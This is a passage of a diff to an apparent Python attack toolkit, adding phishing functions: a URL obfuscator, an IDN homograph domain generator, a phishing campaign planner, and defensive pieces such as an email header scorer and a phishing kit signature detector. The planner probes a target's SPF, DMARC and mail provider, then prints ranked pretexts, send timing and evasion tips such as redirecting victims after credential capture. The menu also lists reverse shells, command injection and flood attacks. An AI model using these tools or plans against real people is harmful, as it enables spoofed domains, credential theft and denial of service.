+    # @ trick
+    results.append(("@ Redirect", f"{scheme}://legitimate-site.com@{host}{path}"))
+
+    # Subdomain confusion
+    results.append(("Subdomain Spoof", f"{scheme}://login.microsoft.com.{host}{path}"))
+
+    # Right-to-left override
+    results.append(("Unicode RTL", f"{scheme}://\u202e{host[::-1]}{path}"))
+
+    # URL with credentials
+    results.append(("URL Credentials", f"{scheme}://user:password@{host}{path}"))
+
+    # Fragment trick
+    results.append(("Fragment Trick", f"{scheme}://legitimate.com#{url}"))
+
+    # Short hex host
+    if octets:
+        results.append(("Short IP", f"{scheme}://{octets[0]}.{octets[1]}.{(octets[2] << 8) + octets[3]}{path}"))
+
+    print(f"\n  {Y}Obfuscated URLs:{RST}\n")
+    for label, obf_url in results:
+        print(f"  {C}{label:<22}{RST} {W}{obf_url}{RST}")
+
+
+# ─── 87. Phishing Email Header Analyzer ──────────────────────────────────────
+
+def email_header_analyzer():
+    print_header("Phishing Email Header Analyzer")
+    print(f"  {Y}Paste email headers (end with empty line):{RST}")
+
+    lines = []
+    while True:
+        line = input()
+        if line.strip() == "":
+            break
+        lines.append(line)
+
+    if not lines:
+        print_err("No headers provided")
+        return
+
+    raw = "\n".join(lines)
+    spinner("Analyzing headers...", 1.0)
+
+    findings = []
+    score = 0
+
+    # Parse headers into dict
+    headers = {}
+    current_key = None
+    for line in lines:
+        if ":" in line and not line.startswith((" ", "\t")):
+            key, _, val = line.partition(":")
+            current_key = key.strip()
+            headers[current_key.lower()] = val.strip()
+        elif current_key and line.startswith((" ", "\t")):
+            headers[current_key.lower()] += " " + line.strip()
+
+    # From analysis
+    from_header = headers.get("from", "")
+    return_path = headers.get("return-path", "")
+    if from_header:
+        print_row("From", from_header)
+    if return_path:
+        print_row("Return-Path", return_path)
+        if from_header and return_path:
+            from_domain = re.search(r'@([\w.-]+)', from_header)
+            rp_domain = re.search(r'@([\w.-]+)', return_path)
+            if from_domain and rp_domain and from_domain.group(1).lower() != rp_domain.group(1).lower():
+                score += 25
+                findings.append(("Domain mismatch", f"From: {from_domain.group(1)} vs Return-Path: {rp_domain.group(1)}"))
+
+    # SPF result
+    auth_results = headers.get("authentication-results", "")
+    received_spf = headers.get("received-spf", "")
+    spf_text = auth_results + " " + received_spf
+    if "spf=fail" in spf_text.lower() or "spf=softfail" in spf_text.lower():
+        score += 20
+        findings.append(("SPF Failed", "Sender IP not authorized"))
+    elif "spf=pass" in spf_text.lower():
+        print_ok("SPF: PASS")
+
+    # DKIM result
+    if "dkim=fail" in auth_results.lower():
+        score += 20
+        findings.append(("DKIM Failed", "Email signature invalid"))
+    elif "dkim=pass" in auth_results.lower():
+        print_ok("DKIM: PASS")
+
+    # DMARC result
+    if "dmarc=fail" in auth_results.lower():
+        score += 20
+        findings.append(("DMARC Failed", "Domain policy not met"))
+    elif "dmarc=pass" in auth_results.lower():
+        print_ok("DMARC: PASS")
+
+    # Reply-To mismatch
+    reply_to = headers.get("reply-to", "")
+    if reply_to and from_header:
+        from_dom = re.search(r'@([\w.-]+)', from_header)
+        reply_dom = re.search(r'@([\w.-]+)', reply_to)
+        if from_dom and reply_dom and from_dom.group(1).lower() != reply_dom.group(1).lower():
+            score += 15
+            findings.append(("Reply-To mismatch", f"From: {from_dom.group(1)} vs Reply-To: {reply_dom.group(1)}"))
+
+    # X-Mailer
+    x_mailer = headers.get("x-mailer", "")
+    if x_mailer:
+        print_row("X-Mailer", x_mailer)
+        sus_mailers = ["phpmailer", "swiftmailer", "king-phisher", "gophish", "set"]
+        for m in sus_mailers:
+            if m in x_mailer.lower():
+                score += 15
+                findings.append(("Suspicious mailer", x_mailer))
+
+    # Received hops
+    received = [v for k, v in zip(lines, lines) if k.lower().startswith("received:")]
+    if received:
+        print_row("Received Hops", str(len(received)))
+
+    # Subject urgency
+    subject = headers.get("subject", "")
+    if subject:
+        print_row("Subject", subject)
+        urgent_words = ["urgent", "immediate", "action required", "verify", "suspended",
+                        "locked", "unusual", "security alert", "confirm", "expire"]
+        found_urgent = [w for w in urgent_words if w in subject.lower()]
+        if found_urgent:
+            score += 10
+            findings.append(("Urgency tactics", ", ".join(found_urgent)))
+
+    # Display findings
+    if findings:
+        print(f"\n  {Y}── Suspicious Indicators ──{RST}")
+        for title, detail in findings:
+            print(f"    {R}■{RST} {Y}{title}:{RST} {W}{detail}{RST}")
+
+    print(f"\n  {Y}── Phishing Score ──{RST}")
+    score = min(score, 100)
+    if score >= 60:
+        print(f"  {R}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — LIKELY PHISHING{RST}")
+    elif score >= 30:
+        print(f"  {Y}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — SUSPICIOUS{RST}")
+    else:
+        print(f"  {G}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — APPEARS LEGITIMATE{RST}")
+
+
+# ─── 88. IDN Homograph Attack Gen ────────────────────────────────────────────
+
+IDN_MAP = {
+    'a': 'а', 'c': 'с', 'd': 'ԁ', 'e': 'е', 'g': 'ɡ', 'h': 'һ',
+    'i': 'і', 'j': 'ј', 'k': 'к', 'l': 'ӏ', 'o': 'о', 'p': 'р',
+    'q': 'ԛ', 's': 'ѕ', 'w': 'ԝ', 'x': 'х', 'y': 'у',
+}
+
+
+def idn_homograph():
+    print_header("IDN Homograph Attack Generator")
+    if not phishing_disclaimer():
+        return
+
+    domain = prompt("Target domain (e.g. apple.com)")
+    if not domain:
+        return
+
+    name, _, tld = domain.partition(".")
+    if not tld:
+        print_err("Enter domain with TLD")
+        return
+
+    results = []
+
+    # Full homograph (replace all possible chars)
+    full = "".join(IDN_MAP.get(c, c) for c in name.lower())
+    if full != name.lower():
+        puny = "xn--" + full.encode("punycode").decode()
+        results.append((f"{full}.{tld}", f"{puny}.{tld}", "Full homograph"))
+
+    # Single char replacements
+    for i, char in enumerate(name.lower()):
+        if char in IDN_MAP:
+            fake = name[:i] + IDN_MAP[char] + name[i+1:]
+            puny = "xn--" + fake.encode("punycode").decode()
+            results.append((f"{fake}.{tld}", f"{puny}.{tld}", f"'{char}' → Cyrillic (pos {i})"))
+
+    # Multi char combos
+    replaceable = [(i, c) for i, c in enumerate(name.lower()) if c in IDN_MAP]
+    if len(replaceable) >= 2:
+        for a in range(len(replaceable)):
+            for b in range(a + 1, min(a + 3, len(replaceable))):
+                idx_a, char_a = replaceable[a]
+                idx_b, char_b = replaceable[b]
+                fake = list(name.lower())
+                fake[idx_a] = IDN_MAP[char_a]
+                fake[idx_b] = IDN_MAP[char_b]
+                fake_str = "".join(fake)
+                puny = "xn--" + fake_str.encode("punycode").decode()
+                results.append((f"{fake_str}.{tld}", f"{puny}.{tld}",
+                               f"'{char_a}'+'{char_b}' → Cyrillic (pos {idx_a},{idx_b})"))
+
+    if not results:
+        print_warn("No homograph substitutions possible for this domain")
+        return
+
+    # Deduplicate
+    seen = set()
+    unique = []
+    for visual, puny, desc in results:
+        if puny not in seen:
+            seen.add(puny)
+            unique.append((visual, puny, desc))
+
+    print(f"\n  {Y}Generated {len(unique)} IDN homograph domains:{RST}\n")
+    print(f"  {C}{'Visual':<30} {'Punycode':<40} {'Type'}{RST}")
+    print(f"  {'─' * 90}")
+    for visual, puny, desc in unique[:40]:
+        print(f"  {W}{visual:<30}{RST} {Y}{puny:<40}{RST} {C}{desc}{RST}")
+
+    if len(unique) > 40:
+        print(f"\n  {Y}... and {len(unique) - 40} more{RST}")
+
+    print(f"\n  {Y}NOTE:{RST} Modern browsers show punycode for mixed-script domains.")
+    print(f"  {Y}Full-script homographs (all chars replaced) are most effective.{RST}")
+
+
+# ─── 89. Phishing Kit Detector ───────────────────────────────────────────────
+
+PHISHING_KIT_SIGS = {
+    "GoPhish": ["rid=", "goPhish", "/track?", "X-Gophish-Contact"],
+    "King Phisher": ["king-phisher", "kp_campaign", "kp_"],
+    "Evilginx2": ["__evilginx", "ident=", "/lures/"],
+    "Modlishka": ["modlishka", "phishlet"],
+    "SET (Social Engineering Toolkit)": ["/set/", "credential_harvester"],
+    "HiddenEye": ["hiddeneye", "hidden_eye"],
+    "SocialFish": ["socialfish", "social_fish"],
+    "BlackEye": ["blackeye", "black_eye"],
+    "ShellPhish": ["shellphish", "shell_phish"],
+    "Zphisher": ["zphisher", ".zphisher"],
+    "Generic Kit": ["action=\"harvest\"", "action=\"collect\"", "action=\"post.php\"",
+                     "password\" name=\"pass", "email\" name=\"login"],
+}
+
+
+def phishing_kit_detector():
+    print_header("Phishing Kit Detector")
+    target = prompt("Suspicious URL to scan")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Scanning for phishing kit signatures...", 1.5)
+
+    try:
+        resp = requests.get(target, timeout=10, verify=False)
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    body = resp.text.lower()
+    headers_str = str(resp.headers).lower()
+    detected = []
+
+    for kit, signatures in PHISHING_KIT_SIGS.items():
+        matches = []
+        for sig in signatures:
+            if sig.lower() in body or sig.lower() in headers_str:
+                matches.append(sig)
+        if matches:
+            detected.append((kit, matches))
+
+    # Additional checks
+    print(f"\n  {Y}── Page Analysis ──{RST}")
+    print_row("Status Code", str(resp.status_code))
+    print_row("Content-Length", str(len(resp.text)))
+    server = resp.headers.get("Server", "N/A")
+    print_row("Server", server)
+
+    # Form analysis
+    if BeautifulSoup:
+        soup = BeautifulSoup(resp.text, "html.parser")
+        forms = soup.find_all("form")
+        print_row("Forms Found", str(len(forms)))
+        for i, form in enumerate(forms, 1):
+            action = form.get("action", "")
+            method = form.get("method", "GET").upper()
+            pwd_fields = form.find_all("input", {"type": "password"})
+            if pwd_fields:
+                print(f"    {R}⚠{RST} Form #{i}: {method} to '{action}' — has password field!")
+                if action and not action.startswith(("http://", "https://", "/")):
+                    detected.append(("Suspicious Form", [f"action='{action}'"]))
+
+    # Check for common phishing indicators
+    phish_indicators = {
+        "Password field + external action": "password" in body and "action=\"http" in body,
+        "Login form with PHP handler": "action=\"" in body and ".php" in body and "password" in body,
+        "Suspicious JavaScript redirect": "window.location" in body and "password" in body,
+        "Base64 encoded content": "atob(" in body or "btoa(" in body,
+        "Obfuscated JavaScript": "eval(unescape" in body or "eval(String.fromCharCode" in body,
+        "Hidden iframe": 'style="display:none"' in body and "<iframe" in body,
+    }
+
+    print(f"\n  {Y}── Behavior Indicators ──{RST}")
+    for desc, is_hit in phish_indicators.items():
+        if is_hit:
+            print(f"    {R}■{RST} {desc}")
+            detected.append(("Indicator", [desc]))
+        else:
+            print(f"    {G}□{RST} {desc}")
+
+    if detected:
+        print(f"\n  {R}── Detected Phishing Signatures ──{RST}")
+        for kit, sigs in detected:
+            print(f"    {R}[DETECTED]{RST} {Y}{kit}{RST}: {W}{', '.join(sigs)}{RST}")
+        print(f"\n  {R}WARNING: This page shows {len(detected)} phishing indicator(s)!{RST}")
+    else:
+        print(f"\n  {G}No known phishing kit signatures detected{RST}")
+        print(f"  {Y}Note: custom or unknown kits may not be detected{RST}")
+
+
+# ─── 90. Phishing Campaign Planner ───────────────────────────────────────────
+
+def phishing_planner():
+    print_header("Phishing Campaign Planner")
+    if not phishing_disclaimer():
+        return
+
+    domain = prompt("Target organization domain")
+    if not domain:
+        return
+
+    spinner("Gathering intelligence...", 1.5)
+
+    print(f"\n  {Y}══ Campaign Intelligence Report ══{RST}\n")
+
+    # Email security posture
+    print(f"  {Y}── 1. Email Security Posture ──{RST}")
+    spf_weak = False
+    dmarc_weak = False
+    if dns:
+        try:
+            answers = dns.resolver.resolve(domain, "TXT")
+            for rdata in answers:
+                txt = rdata.to_text().strip('"')
+                if "v=spf1" in txt:
+                    if "-all" in txt:
+                        print(f"    SPF: {G}Hard fail (-all){RST}")
+                    elif "~all" in txt:
+                        print(f"    SPF: {Y}Soft fail (~all) — bypassable{RST}")
+                        spf_weak = True
+                    else:
+                        print(f"    SPF: {R}Weak/missing{RST}")
+                        spf_weak = True
+                    break
+            else:
+                print(f"    SPF: {R}No record found{RST}")
+                spf_weak = True
+        except Exception:
+            print(f"    SPF: {R}No record found{RST}")
+            spf_weak = True
+
+        try:
+            answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
+            for rdata in answers:
+                txt = rdata.to_text().strip('"')
+                if "v=DMARC1" in txt:
+                    if "p=reject" in txt:
+                        print(f"    DMARC: {G}Reject policy{RST}")
+                    elif "p=quarantine" in txt:
+                        print(f"    DMARC: {Y}Quarantine{RST}")
+                        dmarc_weak = True
+                    else:
+                        print(f"    DMARC: {R}None/monitor only{RST}")
+                        dmarc_weak = True
+                    break
+            else:
+                print(f"    DMARC: {R}No record{RST}")
+                dmarc_weak = True
+        except Exception:
+            print(f"    DMARC: {R}No record{RST}")
+            dmarc_weak = True
+    else:
+        print(f"    {Y}dnspython not installed — skipping DNS checks{RST}")
+
+    # MX servers
+    print(f"\n  {Y}── 2. Mail Infrastructure ──{RST}")
+    mx_provider = "Unknown"
+    if dns:
+        try:
+            answers = dns.resolver.resolve(domain, "MX")
+            for rdata in sorted(answers, key=lambda r: r.preference):
+                mx = str(rdata.exchange).rstrip(".")
+                print(f"    MX: {W}{mx}{RST} (priority {rdata.preference})")
+                if "google" in mx or "gmail" in mx:
+                    mx_provider = "Google Workspace"
+                elif "outlook" in mx or "microsoft" in mx:
+                    mx_provider = "Microsoft 365"
+                elif "protonmail" in mx:
+                    mx_provider = "ProtonMail"
+            print(f"    Provider: {C}{mx_provider}{RST}")
+        except Exception:
+            print(f"    {Y}Could not resolve MX{RST}")
+
+    # Web technologies
+    print(f"\n  {Y}── 3. Web Presence ──{RST}")
+    try:
+        resp = requests.get(f"https://{domain}", timeout=10)
+        server = resp.headers.get("Server", "Unknown")
+        print(f"    Server: {W}{server}{RST}")
+        powered = resp.headers.get("X-Powered-By", "")
+        if powered:
+            print(f"    Powered-By: {W}{powered}{RST}")
+    except Exception:
+        print(f"    {Y}Could not fetch website{RST}")
+
+    # Recommendations
+    print(f"\n  {Y}── 4. Campaign Recommendations ──{RST}")
+
+    print(f"\n  {C}Pretexts (ranked by effectiveness):{RST}")
+    pretexts = [
+        "Password expiry notification",
+        "IT security policy update acknowledgment",
+        "Shared document from colleague / CEO",
+        "Invoice / financial report review",
+        "Multi-factor authentication enrollment",
+        "VPN/remote access reconfiguration",
+        "Annual security awareness training",
+        "Benefits enrollment / HR update",
+    ]
+    for i, p in enumerate(pretexts, 1):
+        print(f"    {C}{i}.{RST} {W}{p}{RST}")
+
+    print(f"\n  {C}Recommended approach:{RST}")
+    if spf_weak or dmarc_weak:
+        print(f"    {R}•{RST} Direct email spoofing is viable (weak SPF/DMARC)")
+    else:
+        print(f"    {G}•{RST} Use lookalike domain (strong SPF/DMARC in place)")
+
+    if mx_provider == "Microsoft 365":
+        print(f"    {W}•{RST} Use Office 365 login template")
+        print(f"    {W}•{RST} Pretext: 'Shared OneDrive document' or 'Teams message'")
+    elif mx_provider == "Google Workspace":
+        print(f"    {W}•{RST} Use Google login template")
+        print(f"    {W}•{RST} Pretext: 'Shared Google Doc' or 'Drive access request'")
+    else:
+        print(f"    {W}•{RST} Use generic corporate login template")
+
+    print(f"\n  {C}Timing:{RST}")
+    print(f"    {W}•{RST} Best: Tuesday-Thursday, 9-11 AM or 2-3 PM local time")
+    print(f"    {W}•{RST} Avoid: Monday mornings, Friday afternoons")
+
+    print(f"\n  {C}Evasion tips:{RST}")
+    print(f"    {W}•{RST} Warm up sending domain (age > 30 days)")
+    print(f"    {W}•{RST} Configure SPF/DKIM/DMARC on phishing domain")
+    print(f"    {W}•{RST} Use aged, categorized domain")
+    print(f"    {W}•{RST} SSL certificate on phishing infrastructure")
+    print(f"    {W}•{RST} Redirect after credential capture to real site")
+
+
 # ─── Menu System ───────────────────────────────────────────────────────────────
 
 RECON_ITEMS = [
@@ -3576,6 +6607,16 @@ RECON_ITEMS = [
     ("DNS Zone Transfer Check", dns_zone_transfer),
     ("SSL/TLS Suite Scanner", ssl_scanner),
     ("Shodan Host Lookup", shodan_lookup),
+    ("Favicon Hash Lookup", favicon_hash),
+    ("DMARC / SPF / DKIM Check", dmarc_spf_dkim),
+    ("Security.txt Checker", security_txt),
+    ("HTTP Methods Discovery", http_methods),
+    ("Cloud Storage Finder", cloud_storage_finder),
+    ("JS Endpoint Extractor", js_endpoint_extractor),
+    ("WAF / CDN Detector", waf_detector),
+    ("Banner Grabbing", banner_grab),
+    ("Subdomain Bruteforce", subdomain_brute),
+    ("Ping Sweep / Host Discovery", ping_sweep),
 ]
 
 EXPLOIT_ITEMS = [
@@ -3589,6 +6630,16 @@ EXPLOIT_ITEMS = [
     ("Reverse Shell Generator", revshell_generator),
     ("CMS Vulnerability Scanner", cms_vuln_scanner),
     ("Payload Encoder / Decoder", payload_encoder),
+    ("CRLF Injection Tester", crlf_injection),
+    ("SSRF Tester", ssrf_tester),
+    ("JWT Analyzer", jwt_analyzer),
+    ("Clickjacking Tester", clickjacking_test),
+    ("XXE Tester", xxe_tester),
+    ("Command Injection Tester", cmd_injection),
+    ("Host Header Injection", host_header_injection),
+    ("Insecure Cookie Checker", cookie_checker),
+    ("CSRF Token Analyzer", csrf_analyzer),
+    ("Prototype Pollution Scanner", prototype_pollution),
 ]
 
 STRESS_ITEMS = [
@@ -3600,37 +6651,56 @@ STRESS_ITEMS = [
     ("ICMP Ping Flood", icmp_flood),
     ("HTTP Slow Read", http_slow_read),
     ("GoldenEye (Keep-Alive Flood)", goldeneye),
+    ("DNS Flood", dns_flood),
+    ("WebSocket Flood", websocket_flood),
 ]
 
-MENU_ITEMS = RECON_ITEMS + EXPLOIT_ITEMS + STRESS_ITEMS
+PHISHING_ITEMS = [
+    ("Homoglyph Domain Generator", homoglyph_generator),
+    ("Phishing URL Analyzer", phishing_url_analyzer),
+    ("Email Spoofing Checker", email_spoof_check),
+    ("Typosquatting Generator", typosquat_generator),
+    ("Credential Harvester Gen", credential_harvest_gen),
+    ("URL Obfuscator", url_obfuscator),
+    ("Email Header Analyzer", email_header_analyzer),
+    ("IDN Homograph Attack Gen", idn_homograph),
+    ("Phishing Kit Detector", phishing_kit_detector),
+    ("Phishing Campaign Planner", phishing_planner),
+]
+
+MENU_ITEMS = RECON_ITEMS + EXPLOIT_ITEMS + STRESS_ITEMS + PHISHING_ITEMS
 
 
 def show_menu():
-    w = 54
+    name_w = 31
+    w = 12 + 2 * name_w  # 74
+
+    def _section(title, items, start, clr):
+        print(f"  {Y}╠{'═' * w}╣{RST}")
+        print(f"  {Y}║{clr}{'── ' + title + ' ──':^{w}}{Y}║{RST}")
+        print(f"  {Y}╠{'═' * w}╣{RST}")
+        for r in range(0, len(items), 2):
+            i1 = start + r
+            n1 = items[r][0]
+            left = f" {clr}{i1:>2}.{RST} {W}{n1:<{name_w}}{RST}"
+            if r + 1 < len(items):
+                i2 = start + r + 1
+                n2 = items[r + 1][0]
+                right = f"  {clr}{i2:>2}.{RST} {W}{n2:<{name_w}}{RST} "
+            else:
+                right = " " * (7 + name_w)
+            print(f"  {Y}║{RST}{left}{right}{Y}║{RST}")
+
     print(f"\n  {Y}╔{'═' * w}╗{RST}")
     print(f"  {Y}║{W}{'MAIN MENU':^{w}}{Y}║{RST}")
+    _section("OSINT / RECONNAISSANCE", RECON_ITEMS, 1, C)
+    _section("EXPLOITATION", EXPLOIT_ITEMS, len(RECON_ITEMS) + 1, R)
+    _section("STRESS / DENIAL OF SERVICE", STRESS_ITEMS,
+             len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + 1, R)
+    _section("PHISHING SIMULATION", PHISHING_ITEMS,
+             len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + len(STRESS_ITEMS) + 1, M)
     print(f"  {Y}╠{'═' * w}╣{RST}")
-    print(f"  {Y}║{C}{'── OSINT / RECONNAISSANCE ──':^{w}}{Y}║{RST}")
-    print(f"  {Y}╠{'═' * w}╣{RST}")
-    for i, (name, _) in enumerate(RECON_ITEMS, 1):
-        num = f"{i:>2}"
-        print(f"  {Y}║{RST}  {C}{num}.{RST} {W}{name:<{w-6}}{Y}║{RST}")
-    print(f"  {Y}╠{'═' * w}╣{RST}")
-    print(f"  {Y}║{R}{'── EXPLOITATION ──':^{w}}{Y}║{RST}")
-    print(f"  {Y}╠{'═' * w}╣{RST}")
-    exploit_start = len(RECON_ITEMS) + 1
-    for i, (name, _) in enumerate(EXPLOIT_ITEMS, exploit_start):
-        num = f"{i:>2}"
-        print(f"  {Y}║{RST}  {R}{num}.{RST} {W}{name:<{w-6}}{Y}║{RST}")
-    print(f"  {Y}╠{'═' * w}╣{RST}")
-    print(f"  {Y}║{R}{'── STRESS / DENIAL OF SERVICE ──':^{w}}{Y}║{RST}")
-    print(f"  {Y}╠{'═' * w}╣{RST}")
-    stress_start = len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + 1
-    for i, (name, _) in enumerate(STRESS_ITEMS, stress_start):
-        num = f"{i:>2}"
-        print(f"  {Y}║{RST}  {R}{num}.{RST} {W}{name:<{w-6}}{Y}║{RST}")
-    print(f"  {Y}╠{'═' * w}╣{RST}")
-    print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w-6}}{Y}║{RST}")
+    print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}╚{'═' * w}╝{RST}")
 
 
